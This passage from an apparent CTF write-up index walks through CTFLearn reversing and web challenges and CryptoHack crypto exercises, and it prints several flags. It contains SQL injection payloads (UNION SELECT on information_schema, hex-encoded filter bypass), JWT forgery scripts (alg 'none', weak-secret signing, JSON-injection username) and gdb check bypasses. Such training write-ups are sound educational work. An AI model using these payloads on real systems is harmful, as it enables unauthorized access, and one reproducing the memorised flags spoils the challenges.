&lt;+7&gt;:    mov    0x200a7d(%rip),%eax        # 0x601040 &lt;valid&gt; 0x00000000004005c3 &lt;+13&gt;:   cmp    %eax,-0x4(%rbp) 0x00000000004005c6 &lt;+16&gt;:   jne    0x4005cf &lt;cek+25&gt; 0x00000000004005c8 &lt;+18&gt;:   mov    $0x1,%eax 0x00000000004005cd &lt;+23&gt;:   jmp    0x4005d4 &lt;cek+30&gt; 0x00000000004005cf &lt;+25&gt;:   mov    $0x0,%eax 0x00000000004005d4 &lt;+30&gt;:   pop    %rbp 0x00000000004005d5 &lt;+31&gt;:   ret End of assembler dump.</code></p> <p><code>cmp</code> instruction compares the arg with value stored in <code>eax</code>, acc to which the function returns 0 or 1</p> </li> <li> <p>Set a breakpoint at the <code>cmp</code> instruction:</p> <p>```gdb (gdb) break *cek+13 Breakpoint 2 at 0x4005c3 (gdb) c Continuing. Masukan PIN = 1234</p> <p>Breakpoint 2, 0x00000000004005c3 in cek () (gdb) i r rax            0x51615             333333 rbx            0x7fffffffdee8      140737488346856 rcx            0x0                 0 rdx            0x0                 0 rsi            0x4d2               1234 rdi            0x4d2               1234 rbp            0x7fffffffdda0      0x7fffffffdda0 rsp            0x7fffffffdda0      0x7fffffffdda0 . . . ```</p> <p>Value at <code>rax</code> (eax is the low 32 bits of rax) is <code>333333</code> which might be the correct PIN. 4. Verify:</p> <p><code>shell Masukan PIN = 1234 PIN salah !</code></p> <p><code>shell Masukan PIN = 333333 PIN benar !</code></p> </li>"},{"location":"CTFLearn/Reversing/990/","title":"Reykjavik","text":"<ol> <li>Running the executable file tells us that it requires the flag as cmd arg, which will then be compared with the flag nd printed out.</li> <li> <p>Start gdb and set a breakpoint at main():</p> <p><code>bash gdb ./Reykjavik</code></p> <p>```gdb Reading symbols from ./Reykjavik... (No debugging symbols found in ./Reykjavik) (gdb) break main  Breakpoint 1 at 0x10a0 (gdb) run some-random-string Starting program: /home/harshit/Downloads/Reykjavik some-random-string [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".</p> <p>Breakpoint 1, 0x00005555555550a0 in main () ```</p> </li> <li> <p>Disassemble main() and look for <code>strcmp</code>, that may have been used to compare the arg and flag:</p> <p><code>gdb Breakpoint 1, 0x00005555555550a0 in main () (gdb) set disassembly-flavor intel (gdb) disas main Dump of assembler code for function main: =&gt;  0x00005555555550a0 &lt;+0&gt;: endbr64     0x00005555555550a4 &lt;+4&gt;:    push   r13     0x00005555555550a6 &lt;+6&gt;:    push   r12     .     .     .     0x0000555555555161 &lt;+193&gt;: xor    eax,0xffffffab     0x0000555555555164 &lt;+196&gt;: mov    BYTE PTR [rsp+0x1a],al     0x0000555555555168 &lt;+200&gt;: call   0x555555555080 &lt;strcmp@plt&gt;     0x000055555555516d &lt;+205&gt;: mov    r12d,eax     0x0000555555555170 &lt;+208&gt;: test   eax,eax     0x0000555555555172 &lt;+210&gt;: jne    0x555555555197 &lt;main+247&gt;     0x0000555555555174 &lt;+212&gt;: mov    rdx,r13     .     .     . End of assembler dump.</code></p> </li> <li> <p>If compared strings are equal, strcmp returns 0 (<code>man 3 strcmp</code> for more info), which is stored in <code>eax</code>. \\ <code>test eax, eax</code> checks if eax is zero or not. Set a breakpoint at that instruction and print the values of registers:</p> <p>```gdb (gdb) break *0x0000555555555170 Breakpoint 2 at 0x555555555170 (gdb) c Continuing. Welcome to the CTFlearn Reversing Challenge Reykjavik v2: some-random-string Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse</p> <p>Breakpoint 2, 0x0000555555555170 in main () (gdb) info registers rax            0xffffffd0          4294967248 rbx            0x7fffffffdeb8      140737488346808 rcx            0x73                115 rdx            0x76304c5f6579457b  8516390867965658491 . . . ```</p> <p>Observe <code>rax</code> (eax is the low 32 bits of rax), which is currently non-zero (obviously).</p> </li> <li> <p>Set the value of the register as 0 and continue:</p> <p>```gdb (gdb) set $eax=0 (gdb) info registers rax            0x0                 0 rbx            0x7fffffffdeb8      140737488346808 rcx            0x73                115 rdx            0x76304c5f6579457b  8516390867965658491 . . .</p> <p>(gdb) c Continuing. Congratulations, you found the flag!!: 'CTFlearn{Eye_L0ve_Iceland_}'</p> <p>[Inferior 1 (process 985301) exited with code 0320] ```</p> </li> </ol>"},{"location":"CTFLearn/Reversing/991/","title":"Riyadh","text":"<ol> <li>Start gdb, <code>break</code> at main, <code>run</code> with some random flag, and <code>disas</code> main</li> <li> <p>First of all, function _Z4Msg1Pc is called, after which there's a puts. Disassembling and observing (too complex) doesn't help much. Break after function:</p> <p>```gdb (gdb) b *main+43 Breakpoint 2 at 0x55555555512b (gdb) c Continuing.</p> <p>Breakpoint 2, 0x000055555555512b in main () (gdb) x/s $rbp 0x5555555581c0 :    \"Welcome to CTFlearn Riyadh Reversing Challenge!\" ``` <li> <p>Function _Z18CTFLearnHiddenFlagv doesnt't do anything:</p> <p><code>gdb (gdb) disas _Z18CTFLearnHiddenFlagv Dump of assembler code for function _Z18CTFLearnHiddenFlagv: 0x0000555555555d20 &lt;+0&gt;:    endbr64 0x0000555555555d24 &lt;+4&gt;:    ret End of assembler dump.</code></p> </li> <li> <p>Doing point-2 above with _Z4Msg3Pc:</p> <p>```gdb (gdb) b *main+90 Breakpoint 5 at 0x55555555515a (gdb) c Continuing.</p> <p>Breakpoint 5, 0x000055555555515a in main () (gdb) x/s $rbp 0x5555555581c0 :    \"CTFlearn{Reversing_Is_Easy}\" ``` <p>Trying this tells this isn't the actual flag :cry: \\ The strcmp after this _Z4Msg3Pc probably takes the program to instructions which print \"You found the false flag!  It's not that easy dude!\". So running with some other flag would bypass this jump.</p> <li> <p>To reach _Z4Msg5Pc, we have to pass strlen test:</p> <p>```gdb (gdb) b main+117 Breakpoint 9 at 0x555555555175 (gdb) bmain+151 Breakpoint 10 at 0x555555555197 (gdb) c Continuing.</p> <p>Breakpoint 9, 0x0000555555555175 in main () (gdb) set $rax=0x1e (gdb) c Continuing.</p> <p>Breakpoint 10, 0x0000555555555197 in main () (gdb) x/s $rbp 0x55555556b6c0: \"CTFlearn{Masmak_Fortress_1865}\" ```</p> </li>"},{"location":"CTFLearn/Web/109/","title":"Don't Bump Your Head(er)","text":"<ol> <li>Go to the given site and inspect it.</li> <li>Get the <code>user-agent</code> from the HTML comments.</li> <li>Make a GET request:<ul> <li>Using Postman, Thunder Client, or similar; setting HTTP Header <code>User-Agent: &lt;user-agent&gt;</code></li> <li>Use the following <code>curl</code> command:   <code>bash   curl -H \"User-Agent: &lt;user-agent&gt;\" &lt;given site&gt;</code></li> <li>Use the following <code>curl</code> command:   <code>bash   curl --user-agent &lt;user-agent&gt; &lt;given site&gt;</code></li> </ul> </li> <li>Note the <code>referer</code> from the above response and send another request with that in header:<ul> <li>Using Postman, Thunder Client, or similar; setting HTTP Header <code>User-Agent: &lt;user-agent&gt; Referer: &lt;referer&gt;</code></li> <li>Use the following <code>curl</code> command:   <code>bash   curl -H \"User-Agent: &lt;user-agent&gt;\" -H \"Referer: &lt;referer&gt;\" &lt;given site&gt;</code></li> <li>Use the following <code>curl</code> command:   <code>bash   curl --user-agent &lt;user-agent&gt; --referer &lt;referer&gt; &lt;given site&gt;</code></li> </ul> </li> </ol>"},{"location":"CTFLearn/Web/114/","title":"POST Practice","text":"<ol> <li>Go to the given site and inspect it.</li> <li>Get the <code>username</code> and <code>password</code> from the HTML comments.</li> <li>Make a POST request:<ul> <li>Using Postman, Thunder Client, or similar; sending <code>username</code> and <code>password</code> as Form data.</li> <li>Use the following <code>curl</code> command:   <code>bash   curl -d \"username=&lt;username&gt;&amp;password=&lt;password&gt;\" -X POST &lt;given site&gt;</code></li> </ul> </li> </ol>"},{"location":"CTFLearn/Web/149/","title":"Inj3ction Time","text":"<pre><code>1 OR 1=1\n</code></pre> <p>lists all the entries of the dogs table, not really helpful</p> <p>To determine number of columns in the result set:</p> <pre><code>1 ORDER BY 1\n1 ORDER BY 2\n1 ORDER BY 3\n1 ORDER BY 4\n1 ORDER BY 5\n</code></pre> <p>At 5, it gives no results; so there are 4 columns</p> <p>Querying for version:</p> <pre><code>1 UNION SELECT NULL, @@version, NULL, NULL\n</code></pre> <p>The result is <code>5.5.58-0ubuntu0.14.04.1</code>, which is a MySQL version</p> <p>Querying for table names:</p> <pre><code>1 UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables\n</code></pre> <p>A promising table name: <code>w0w_y0u_f0und_m3</code></p> <p>Quering for its columns:</p> <pre><code>1 UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name='w0w_y0u_f0und_m3'\n</code></pre> <p>But this gives no results, maybe because quotes are disallowed. So, using hex:</p> <pre><code>1 UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name=0x7730775F7930755F6630756E645F6D33\n</code></pre> <p>A promising column name: <code>f0und_m3</code></p> <p>Querying for the rows:</p> <pre><code>1 UNION SELECT NULL, f0und_m3, NULL, NULL FROM w0w_y0u_f0und_m3\n</code></pre> <p>Voila!</p>"},{"location":"CTFLearn/Web/88/","title":"Basic Injection","text":"<p>Refer this lesson</p>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/","title":"JSON Web Tokens","text":""},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/#1-token-appreciation","title":"1. Token Appreciation","text":"<pre><code>import jwt\n\ntoken = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmbGFnIjoiY3J5cHRve2p3dF9jb250ZW50c19jYW5fYmVfZWFzaWx5X3ZpZXdlZH0iLCJ1c2VyIjoiQ3J5cHRvIE1jSGFjayIsImV4cCI6MjAwNTAzMzQ5M30.shKSmZfgGVvd2OSB2CGezzJ3N6WAULo3w9zCl_T47KQ\"\ndecoded_token = jwt.decode(token, options={\"verify_signature\": False})\nprint(decoded_token)\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/#2-jwt-sessions","title":"2. JWT Sessions","text":"<pre><code>Authorization\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/#3-no-way-jose","title":"3. No Way JOSE","text":"<pre><code>import jwt\nimport requests\nimport json\n\nurl = \"https://web.cryptohack.org/no-way-jose/\"\nusername = \"user\"\n\ntoken = requests.get(url + \"create_session/\" + username + \"/\").json()[\"session\"]\nheader, payload, signature = token.split(\".\")\nheader = json.loads(jwt.utils.base64url_decode(header).decode())\npayload = json.loads(jwt.utils.base64url_decode(payload).decode())\n# print(header)\n# print(payload)\nheader[\"alg\"] = \"none\"\npayload[\"admin\"] = True\n\nheader = jwt.utils.base64url_encode(json.dumps(header).encode()).decode()\npayload = jwt.utils.base64url_encode(json.dumps(payload).encode()).decode()\nnew_token = header + \".\" + payload + \".\" + signature\n\nflag = requests.get(url + \"authorise/\" + new_token + \"/\").json()[\"response\"]\nprint(flag)\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/#4-jwt-secrets","title":"4. JWT Secrets","text":"<p>PyJWT README</p> <pre><code>import jwt\nimport requests\nimport json\n\nurl = \"https://web.cryptohack.org/jwt-secrets/\"\nusername = \"user\"\nSECRET_KEY = \"secret\"\n\ntoken = requests.get(url + \"create_session/\" + username + \"/\").json()[\"session\"]\nheader, payload, signature = token.split(\".\")\npayload = json.loads(jwt.utils.base64url_decode(payload).decode())\npayload[\"admin\"] = True\n\nnew_token = jwt.encode(payload, SECRET_KEY, algorithm=\"HS256\")\nflag = requests.get(url + \"authorise/\" + new_token + \"/\").json()[\"response\"]\nprint(flag)\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/JSON%20Web%20Tokens/#6-json-in-json","title":"6. JSON in JSON","text":"<pre><code>import jwt\nimport requests\nimport json\n\nurl = \"https://web.cryptohack.org/json-in-json/\"\nusername = \"user\\\" , \\\"admin\\\": \\\"True\"\nSECRET_KEY = \"secret\"\n\ntoken = requests.get(url + \"create_session/\" + username + \"/\").json()[\"session\"]\nheader, payload, signature = token.split(\".\")\npayload = json.loads(jwt.utils.base64url_decode(payload).decode())\nprint(payload)\nflag = requests.get(url + \"authorise/\" + token + \"/\").json()[\"response\"]\nprint(flag)\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/TLS%20Part%201/","title":"TLS Part 1: The Protocol","text":""},{"location":"Cryptohack/Crypto%20on%20the%20Web/TLS%20Part%201/#4-saying-hello","title":"4. Saying Hello","text":"<pre><code>curl --tls-max 1.2 -v https://tls1.cryptohack.org\n</code></pre> <pre><code>openssl s_client -tls1_2 -connect tls1.cryptohack.org:443\n</code></pre>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/TLS%20Part%201/#5-decrypting-tls-12","title":"5. Decrypting TLS 1.2","text":"<ol> <li>Open tha capture file in Wireshark</li> <li>Edit -&gt; Preferences -&gt; RSA Keys -&gt; Add new keyfile -&gt; Select the .pem file containing private key</li> <li>Filter the packets: <code>http2</code></li> <li>Check out the packet no. 27</li> </ol>"},{"location":"Cryptohack/Crypto%20on%20the%20Web/TLS%20Part%201/#6-decrypting-tls-13","title":"6. Decrypting TLS 1.3","text":"<ol> <li>Open tha capture file in Wireshark</li> <li>Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; (Pre)-Master-Secret log filename -&gt; Select the keylogfile</li> <li>Filter the packets: <code>http2</code></li> <li>Check out the packet no. 27</li> </ol>"},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/","title":"Starter","text":""},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/#1-working-with-fields","title":"1. Working with Fields","text":"<pre><code>p = 991\ng = 209\n\nprint(pow(g, -1, p))\n</code></pre>"},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/#2-generators-of-groups","title":"2. Generators of Groups","text":"<pre><code>from sympy import factorint\np = 28151\nfactors = factorint(p-1).keys()\n\nfor g in range(2,p):\n    if pow(g,p-1,p)==1 and all(pow(g, (p-1)//q, p) != 1 for q in factors):\n        print(g)\n        break\n</code></pre>"},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/#3-computing-public-values","title":"3. Computing Public Values","text":"<pre><code>g = 2\np = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919\na = 972107443837033796245864316200458246846904598488981605856765890478853088246897345487328491037710219222038930943365848626194109830309179393018216763327572120124760140018038673999837643377590434413866611132403979547150659053897355593394492586978400044375465657296027592948349589216415363722668361328689588996541370097559090335137676411595949335857341797148926151694299575970292809805314431447043469447485957669949989090202320234337890323293401862304986599884732815\n\nprint(pow(g, a, p))\n</code></pre>"},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/#4-computing-shared-secrets","title":"4. Computing Shared Secrets","text":"<pre><code>g = 2\np = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919\n\nA = 70249943217595468278554541264975482909289174351516133994495821400710625291840101960595720462672604202133493023241393916394629829526272643847352371534839862030410331485087487331809285533195024369287293217083414424096866925845838641840923193480821332056735592483730921055532222505605661664236182285229504265881752580410194731633895345823963910901731715743835775619780738974844840425579683385344491015955892106904647602049559477279345982530488299847663103078045601\n\nb = 12019233252903990344598522535774963020395770409445296724034378433497976840167805970589960962221948290951873387728102115996831454482299243226839490999713763440412177965861508773420532266484619126710566414914227560103715336696193210379850575047730388378348266180934946139100479831339835896583443691529372703954589071507717917136906770122077739814262298488662138085608736103418601750861698417340264213867753834679359191427098195887112064503104510489610448294420720\nB = 518386956790041579928056815914221837599234551655144585133414727838977145777213383018096662516814302583841858901021822273505120728451788412967971809038854090670743265187138208169355155411883063541881209288967735684152473260687799664130956969450297407027926009182761627800181901721840557870828019840218548188487260441829333603432714023447029942863076979487889569452186257333512355724725941390498966546682790608125613166744820307691068563387354936732643569654017172\n\nassert B == pow(g, b, p)\n\nshared_secret = pow(A, b, p)\nprint(shared_secret)\n</code></pre>"},{"location":"Cryptohack/Diffie-Hellman/DH%20Starter/#5-deriving-symmetric-keys","title":"5. Deriving Symmetric Keys","text":"<pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\nimport hashlib\n\n\ndef is_pkcs7_padded(message):\n    padding = message[-message[-1]:]\n    return all(padding[i] == len(padding) for i in range(0, len(padding)))\n\n\ndef decrypt_flag(shared_secret: int, iv: str, ciphertext: str):\n    # Derive AES key from shared secret\n    sha1 = hashlib.sha1()\n    sha1.update(str(shared_secret).encode('ascii'))\n    key = sha1.digest()[:16]\n    # Decrypt flag\n    ciphertext = bytes.fromhex(ciphertext)\n    iv = bytes.fromhex(iv)\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    plaintext = cipher.decrypt(ciphertext)\n\n    if is_pkcs7_padded(plaintext):\n        return unpad(plaintext, 16).decode('ascii')\n    else:\n        return plaintext.decode('ascii')\n\n\ng = 2\np = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919\n\nA = 112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784\n\nb = 197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944\nB = 1241972460522075344783337556660700537760331108332735677863862813666578639518899293226399921252049655031563612905395145236854443334774555982204857895716383215705498970395379526698761468932147200650513626028263449605755661189525521343142979265044068409405667549241125597387173006460145379759986272191990675988873894208956851773331039747840312455221354589910726982819203421992729738296452820365553759182547255998984882158393688119629609067647494762616719047466973581\n\nassert B == pow(g, b, p)\n\nshared_secret = pow(A, b, p)\niv = '737561146ff8194f45290f5766ed6aba'\nencrypted_flag = '39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c'\n\nprint(decrypt_flag(shared_secret, iv, encrypted_flag))\n</code></pre>"},{"location":"Cryptohack/General/Data%20Formats/","title":"Data Formats","text":""},{"location":"Cryptohack/General/Data%20Formats/#1-privacy-enhanced-mail","title":"1. Privacy-Enhanced Mail?","text":"<pre><code>from Crypto.PublicKey import RSA\n\nwith open(\"privacy_enhanced_mail.pem\", \"r\") as f:\n    key = RSA.import_key(f.read())\n    print(key.d)\n</code></pre>"},{"location":"Cryptohack/General/Data%20Formats/#2-certainly-not","title":"2. CERTainly not","text":"<pre><code>openssl x509 -in 2048b-rsa-example-cert.der -inform DER -out 2048b-rsa-example-cert.pem -outform PEM\n</code></pre> <pre><code>from Crypto.PublicKey import RSA\n\nwith open(\"2048b-rsa-example-cert.pem\", \"r\") as f:\n    key = RSA.import_key(f.read())\n    print(key.n)\n</code></pre>"},{"location":"Cryptohack/General/Data%20Formats/#3-ssh-keys","title":"3. SSH Keys","text":"<pre><code>from Crypto.PublicKey import RSA\n\nwith open(\"bruce_rsa.pub\", \"r\") as f:\n    key = RSA.import_key(f.read())\n    print(key.n)\n</code></pre>"},{"location":"Cryptohack/General/Encoding/","title":"Encoding","text":""},{"location":"Cryptohack/General/Encoding/#1-ascii","title":"1. ASCII","text":"<pre><code>print(''.join([chr(x) for x in [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125]]))\n</code></pre>"},{"location":"Cryptohack/General/Encoding/#2-hex","title":"2. Hex","text":"<pre><code>print(bytes.fromhex('63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d'))\n</code></pre>"},{"location":"Cryptohack/General/Encoding/#3-base64","title":"3. Base64","text":"<pre><code>echo \"72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf\" | xxd -r -p | base64\n</code></pre>"},{"location":"Cryptohack/General/Encoding/#4-bytes-and-big-integers","title":"4. Bytes and Big Integers","text":"<pre><code>echo \"obase=16; ibase=10; 11515195063862318899931685488813747395775516287289682636499965282714637259206269\" | bc | xxd -r -p\n</code></pre>"},{"location":"Cryptohack/General/Encoding/#5-encoding-challenge","title":"5. Encoding Challenge","text":"<pre><code>from pwn import *\nimport json\nimport base64\nimport codecs\nfrom Crypto.Util.number import *\n\nr = remote('socket.cryptohack.org', 13377, level='debug')\n\ndef json_recv():\n    line = r.recvline()\n    return json.loads(line.decode())\n\ndef json_send(hsh):\n    request = json.dumps(hsh).encode()\n    r.sendline(request)\n\n\nfor i in range(100):\n    received = json_recv()\n    match received[\"type\"]:\n        case \"base64\":\n            decoded = base64.b64decode(received[\"encoded\"]).decode()\n        case \"hex\":\n            decoded = bytes.fromhex(received[\"encoded\"]).decode()\n        case \"rot13\":\n            decoded = codecs.decode(received[\"encoded\"], 'rot_13')\n        case \"bigint\":\n            decoded = long_to_bytes(int(received[\"encoded\"], 16)).decode()\n        case \"utf-8\":\n            decoded = \"\".join([chr(b) for b in received[\"encoded\"]])\n\n    to_send = {\n        \"decoded\": decoded\n    }\n    json_send(to_send)\n\nreceived = json_recv()\n</code></pre>"},{"location":"Cryptohack/General/XOR/","title":"XOR","text":""},{"location":"Cryptohack/General/XOR/#1-xor-starter","title":"1. XOR Starter","text":"<pre><code>print(\"\".join([chr(13^ord(c)) for c in \"label\"]))\n</code></pre>"},{"location":"Cryptohack/General/XOR/#2-xor-properties","title":"2. XOR Properties","text":"<pre><code># F = (F^K1^K2^K3)^(K2^K3)^K1\nnum = int(\"04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf\",16)^int(\"c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1\",16)^int(\"a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313\",16)\nhex = hex(num)[2::]\nflag = bytes.fromhex(hex).decode()\nprint(flag)\n</code></pre>"},{"location":"Cryptohack/General/XOR/#3-favorite-byte","title":"3. Favorite Byte","text":"<pre><code>hex = \"73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d\"\nflag = bytes.fromhex(hex).decode()\n\nfor byte in range(256):\n    print(\"\".join([chr(ord(x)^byte) for x in flag]))\n</code></pre>"},{"location":"Cryptohack/General/XOR/#4-you-either-know-xor-you-dont","title":"4. You either know, XOR you don't","text":"<pre><code>hex = \"0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104\"\nflag = bytes.fromhex(hex).decode()\n\n# print(chr(ord(flag[0])^ord('c')))\n# print(chr(ord(flag[1])^ord('r')))\n# print(chr(ord(flag[2])^ord('y')))\n# print(chr(ord(flag[3])^ord('p')))\n# print(chr(ord(flag[4])^ord('t')))\n# print(chr(ord(flag[5])^ord('o')))\n# print(chr(ord(flag[6])^ord('{')))\n# print(chr(ord(flag[-1])^ord('}')))\n\nkey = \"myXORkey\"\nfor i in range(len(flag)):\n    print(chr(ord(flag[i])^ord(key[i%len(key)])),end='')\n</code></pre>"},{"location":"Cryptohack/General/XOR/#5-lemur-xor","title":"5. Lemur XOR","text":"<pre><code>import cv2 as cv\n\nimg1 = cv.imread(\"flag.png\")\nimg2 = cv.imread(\"lemur.png\")\n\n# print(img1.shape,img2.shape) # Same shape\n\nxorimg = img1^img2\n\ncv.imshow(\"XOR\",xorimg)\ncv.waitKey(0)\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%201/","title":"Primes Part 1","text":""},{"location":"Cryptohack/RSA/Primes%20Part%201/#1-factoring","title":"1. Factoring","text":"<pre><code>from factordb.factordb import FactorDB\nN = 510143758735509025530880200653196460532653147\nf = FactorDB(N)\nf.connect()\nprint(f.get_factor_list())\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%201/#2-inferius-prime","title":"2. Inferius Prime","text":"<pre><code>from factordb.factordb import FactorDB\nfrom Crypto.Util.number import inverse, long_to_bytes\n\nN = 984994081290620368062168960884976209711107645166770780785733\nf = FactorDB(N)\nf.connect()\np,q = f.get_factor_list()\n# print(p,q)\n\nphi = (p-1)*(q-1)\ne = 0x10001\nd = inverse(e, phi)\nct = 948553474947320504624302879933619818331484350431616834086273\npt = long_to_bytes(pow(ct, d, N))\nprint(pt)\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%201/#3-monoprime","title":"3. Monoprime","text":"<pre><code>from Crypto.Util.number import inverse, long_to_bytes\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1])\n    c = int(f.readline().split()[-1])\n    phi = n-1\n    d = inverse(e, phi)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%201/#4-square-eyes","title":"4. Square Eyes","text":"<pre><code>from Crypto.Util.number import inverse, long_to_bytes\nfrom math import isqrt\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1])\n    c = int(f.readline().split()[-1])\n\n    p = isqrt(n)\n    # print(p)\n    phi = p*(p-1)\n    d = inverse(e, phi)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%201/#5-manyprime","title":"5. Manyprime","text":"<pre><code>from Crypto.Util.number import inverse, long_to_bytes\nfrom math import prod\nfrom factordb.factordb import FactorDB\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1])\n    c = int(f.readline().split()[-1])\n\n    fdb = FactorDB(n)\n    fdb.connect()\n    phi = prod(x-1 for x in fdb.get_factor_list())\n\n    d = inverse(e,phi)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%202/","title":"Primes Part 2","text":""},{"location":"Cryptohack/RSA/Primes%20Part%202/#1-infinite-descent","title":"1. Infinite Descent","text":"<p>p and q are numerically close, so Fermat Factorization</p> <pre><code>from Crypto.Util.number import long_to_bytes, inverse\nfrom math import isqrt\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1]) \n    c = int(f.readline().split()[-1])\n\n    a = isqrt(n) + 1\n    b2 = a**2 - n\n\n    while isqrt(b2)**2 != b2:\n        a += 1\n        b2 = a**2 - n\n\n    b = isqrt(b2)\n    p, q = a - b, a + b\n    phi = (p-1)*(q-1)\n    d = inverse(e, phi)\n    m = pow(c, d, n)\n    print(long_to_bytes(m))\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%202/#2-marins-secrets","title":"2. Marin's Secrets","text":"<p>Mersenne Primes</p> <pre><code>from Crypto.Util.number import long_to_bytes, inverse\n\ndef mersenne(n):\n    n+=1\n    return (1 &lt;&lt; n) - 1\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1]) \n    c = int(f.readline().split()[-1])\n    bc = n.bit_count()\n    for i in range(1, bc):\n        p = mersenne(i)\n        if n%p == 0:\n            q = n//p\n            # print(p,q)\n            phi = (p-1)*(q-1)\n            try:\n                d = inverse(e, phi)\n                m = pow(c, d, n)\n            except ValueError:\n                continue\n            msg = long_to_bytes(m)\n            if b\"crypto\" in msg:\n                print(msg)\n</code></pre>"},{"location":"Cryptohack/RSA/Primes%20Part%202/#3-fast-primes","title":"3. Fast Primes","text":"<pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom factordb.factordb import FactorDB\n\nwith open(\"key.pem\",\"r\") as f:\n    key = RSA.import_key(f.read())\n    # print(key.n, key.e)\n\n    fdb = FactorDB(key.n)\n    fdb.connect()\n    p, q = fdb.get_factor_list()\n    phi = (p-1)*(q-1)\n    d = pow(key.e, -1, phi)\n\n    key = RSA.construct((key.n, key.e, d))\n    cipher = PKCS1_OAEP.new(key)\n    ciphertext = bytes.fromhex(open(\"ciphertext.txt\",\"r\").read())\n    ciphertext = cipher.decrypt(ciphertext)\n    print(ciphertext)\n</code></pre>"},{"location":"Cryptohack/RSA/Public%20Exponent/","title":"Public Exponent","text":""},{"location":"Cryptohack/RSA/Public%20Exponent/#1-salty","title":"1. Salty","text":"<pre><code>from Crypto.Util.number import long_to_bytes\n\nwith open(\"output.txt\", \"r\") as f:\n    n = int(f.readline().split()[-1])\n    e = int(f.readline().split()[-1]) # e=1\n    c = int(f.readline().split()[-1])\n\n    k = 0\n    while True:\n        m = n*k + c\n        msg = long_to_bytes(m)\n        if (msg.startswith(b\"crypto\")):\n            print(msg)\n            break\n        k += 1\n</code></pre>"},{"location":"Cryptohack/RSA/Public%20Exponent/#2-modulus-inutilis","title":"2. Modulus 